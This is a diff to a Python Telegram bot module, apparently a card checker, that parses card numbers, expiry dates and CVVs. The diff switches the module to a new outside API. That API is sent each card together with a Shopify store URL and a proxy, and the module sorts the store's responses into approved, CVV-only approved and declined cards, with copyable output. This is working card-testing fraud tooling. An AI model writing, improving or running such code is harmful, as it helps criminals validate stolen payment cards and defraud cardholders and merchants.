@@ -18,12 +18,12 @@ logger = logging.getLogger("sh")
 BOT_TAG = '<a href="http://t.me/SaitamaChecker_Bot">[拳]</a>'
 
 # ==============================
-# CONFIG
+# CONFIG - NUEVA API
 # ==============================
 
-API_URL = "https://blmautoshopify.onrender.com/berlin.php"
+API_URL = "https://shopi-production-7ef9.up.railway.app/"
 REQUEST_TIMEOUT = 60
-CONNECT_TIMEOUT = 10
+CONNECT_TIMEOUT = 20
 
 CC_REGEX = r'(\d{14,16})[:,.;/\\|\s]+(\d{1,2})[:,.;/\\|\s]+(\d{2,4})[:,.;/\\|\s]+(\d{3,4})'
 
@@ -81,7 +81,7 @@ def get_bin(card_number: str):
     return get_bin_info(card_number[:6])
 
 # ==============================
-# STATUS POR RESPONSE (OFICIAL)
+# STATUS POR RESPONSE (FINAL)
 # ==============================
 
 def status_from_response(resp: str) -> str:
@@ -90,41 +90,48 @@ def status_from_response(resp: str) -> str:
 
     r = resp.upper().replace(" ", "_")
 
-    if any(x in r for x in [
+    APPROVED = [
         "3D_AUTHENTICATION",
         "INSUFFICIENT_FUNDS",
         "INCORRECT_ZIP",
+        "ORDER_COMPLETED",
         "ORDER_PLACED",
         "THANK_YOU"
-    ]):
-        return "Approved ✅"
+    ]
 
-    if any(x in r for x in [
+    APPROVED_CCN = [
         "INCORRECT_CVC",
         "INVALID_CVC"
-    ]):
-        return "Approved CCN ✅"
+    ]
 
-    if any(x in r for x in [
+    DECLINED = [
         "CARD_DECLINED",
         "GENERIC_ERROR",
         "INCORRECT_NUMBER",
         "PROCESSING_ERROR",
         "FRAUD_SUSPECTED",
         "RISKY"
-    ]):
+    ]
+
+    if any(x in r for x in APPROVED):
+        return "Approved ✅"
+
+    if any(x in r for x in APPROVED_CCN):
+        return "Approved CCN ✅"
+
+    if any(x in r for x in DECLINED):
         return "Declined ❌"
 
     return "Error ⚠️"
 
 # ==============================
-# API CALL
+# API CALL - NUEVA IMPLEMENTACIÓN
 # ==============================
 
 async def check_shopify(card, site, proxy):
     params = {
-        "site": format_site(site),
         "cc": build_cc(card),
+        "url": format_site(site),
         "proxy": format_proxy(proxy)
     }
 
@@ -136,19 +143,24 @@ async def check_shopify(card, site, proxy):
     try:
         async with aiohttp.ClientSession(timeout=timeout) as s:
             async with s.get(API_URL, params=params) as r:
-                data = await r.json()
-                return (
-                    data.get("Gateway", "Normal"),
-                    data.get("Price", "0"),
-                    data.get("Response", "N/A")
-                )
+                if r.status == 200:
+                    data = await r.json()
+                    return (
+                        data.get("Gate", "Normal"),
+                        data.get("Price", "0"),
+                        data.get("Response", "N/A")
+                    )
+                else:
+                    return "Normal", "0", f"HTTP {r.status}"
     except asyncio.TimeoutError:
         return "Normal", "0", "TIMEOUT"
+    except aiohttp.ClientError as e:
+        return "Normal", "0", f"CONN_ERR: {str(e)[:40]}"
     except Exception as e:
         return "Normal", "0", str(e)[:60]
 
 # ==============================
-# FORMATO FINAL
+# FORMATO FINAL (COPIABLE)
 # ==============================
 
 def format_result(gateway, price, cc, status, response, bininfo, site_i, proxy_i, t, user):
@@ -158,7 +170,7 @@ def format_result(gateway, price, cc, status, response, bininfo, site_i, proxy_i
         f"{BOT_TAG} <b>Gateway:</b> <code>{title}</code>\n"
         "━━━━━━━━━━━━━━━━\n"
         f"{BOT_TAG} <b>CC:</b> <code>{cc}</code>\n"
-        f"{BOT_TAG} <b>Status:</b> {status}\n"
+        f"{BOT_TAG} <b>Status:</b> <code>{status}</code>\n"
         f"{BOT_TAG} <b>Response:</b> <code>{response}</code>\n"
         "━━━━━━━━━━━━━━━━\n"
         f"{BOT_TAG} <b>Info:</b> <code>{bininfo['info']}</code>\n"
@@ -273,4 +285,4 @@ async def handle_dot(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def register_handlers(app):
     app.add_handler(CommandHandler("sh", handle_sh))
     app.add_handler(MessageHandler(filters.Regex(r"^\.sh\b"), handle_dot))
-    logger.info("Handlers SH cargados")
+    logger.info("Handlers SH cargados con NUEVA API")
